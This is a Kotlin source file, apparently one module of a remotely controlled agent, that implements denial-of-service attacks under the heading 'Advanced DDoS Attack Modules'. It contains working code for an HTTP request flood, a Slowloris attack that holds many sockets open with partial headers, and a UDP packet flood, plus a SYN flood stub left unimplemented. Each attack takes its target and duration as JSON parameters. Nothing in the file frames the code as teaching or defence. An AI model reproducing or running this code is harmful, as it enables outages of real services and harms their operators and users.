package com.redchain.agent.modules

import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.net.Socket
import java.util.concurrent.TimeUnit

/**
 * Advanced DDoS Attack Modules
 * Layer 7 (Application Layer) attacks
 */
object DDoSModule {

    /**
     * HTTP Flood - Simple GET/POST flood
     */
    suspend fun httpFlood(params: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val targetUrl = params.getString("target_url")
        val duration = params.getInt("duration")
        val threadsCount = params.optInt("threads", 10)
        val method = params.optString("method", "GET")

        var totalRequests = 0
        var successful = 0
        var failed = 0

        val client = OkHttpClient.Builder()
            .connectTimeout(5, TimeUnit.SECONDS)
            .readTimeout(5, TimeUnit.SECONDS)
            .build()

        val startTime = System.currentTimeMillis()
        val endTime = startTime + (duration * 1000)

        // Launch multiple coroutines
        val jobs = List(threadsCount) {
            launch {
                while (System.currentTimeMillis() < endTime) {
                    try {
                        val request = Request.Builder()
                            .url(targetUrl)
                            .build()

                        val response = client.newCall(request).execute()
                        synchronized(this) {
                            totalRequests++
                            if (response.isSuccessful) successful++ else failed++
                        }
                        response.close()
                    } catch (e: Exception) {
                        synchronized(this) {
                            totalRequests++
                            failed++
                        }
                    }
                }
            }
        }

        jobs.joinAll()

        JSONObject().apply {
            put("attack_type", "http_flood")
            put("target_url", targetUrl)
            put("total_requests", totalRequests)
            put("successful", successful)
            put("failed", failed)
            put("threads", threadsCount)
            put("duration_seconds", duration)
            put("requests_per_second", totalRequests / duration)
        }
    }

    /**
     * Slowloris Attack - Keep connections open to exhaust server resources
     */
    suspend fun slowloris(params: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val targetHost = params.getString("target_host")
        val targetPort = params.optInt("target_port", 80)
        val socketCount = params.optInt("socket_count", 200)
        val duration = params.getInt("duration")

        val sockets = mutableListOf<Socket>()
        var socketsCreated = 0

        try {
            // Create sockets
            repeat(socketCount) {
                try {
                    val socket = Socket(targetHost, targetPort)
                    socket.getOutputStream().write("GET /?${System.currentTimeMillis()} HTTP/1.1\r\n".toByteArray())
                    socket.getOutputStream().write("Host: $targetHost\r\n".toByteArray())
                    socket.getOutputStream().flush()

                    sockets.add(socket)
                    socketsCreated++
                } catch (e: Exception) {
                    // Socket creation failed
                }
            }

            // Keep sockets alive
            val endTime = System.currentTimeMillis() + (duration * 1000)
            while (System.currentTimeMillis() < endTime) {
                for (socket in sockets) {
                    try {
                        socket.getOutputStream().write("X-a: b\r\n".toByteArray())
                        socket.getOutputStream().flush()
                    } catch (e: Exception) {
                        // Socket closed
                    }
                }
                delay(15000) // Send every 15 seconds
            }

        } finally {
            // Close all sockets
            sockets.forEach { it.close() }
        }

        JSONObject().apply {
            put("attack_type", "slowloris")
            put("target_host", targetHost)
            put("target_port", targetPort)
            put("sockets_created", socketsCreated)
            put("duration_seconds", duration)
        }
    }

    /**
     * UDP Flood
     */
    suspend fun udpFlood(params: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        val targetHost = params.getString("target_host")
        val targetPort = params.getInt("target_port")
        val duration = params.getInt("duration")
        val packetSize = params.optInt("packet_size", 1024)

        var packetsSent = 0
        val payload = ByteArray(packetSize) { 0xFF.toByte() }

        val socket = java.net.DatagramSocket()
        val address = java.net.InetAddress.getByName(targetHost)

        val endTime = System.currentTimeMillis() + (duration * 1000)

        while (System.currentTimeMillis() < endTime) {
            try {
                val packet = java.net.DatagramPacket(payload, payload.size, address, targetPort)
                socket.send(packet)
                packetsSent++
            } catch (e: Exception) {
                // Failed to send
            }
        }

        socket.close()

        JSONObject().apply {
            put("attack_type", "udp_flood")
            put("target_host", targetHost)
            put("target_port", targetPort)
            put("packets_sent", packetsSent)
            put("bytes_sent", packetsSent * packetSize)
            put("duration_seconds", duration)
        }
    }

    /**
     * SYN Flood (requires root)
     */
    fun synFlood(params: JSONObject): JSONObject {
        // SYN flood requires raw socket access (root)
        return JSONObject().apply {
            put("attack_type", "syn_flood")
            put("status", "not_implemented")
            put("reason", "Requires root access for raw sockets")
        }
    }
}
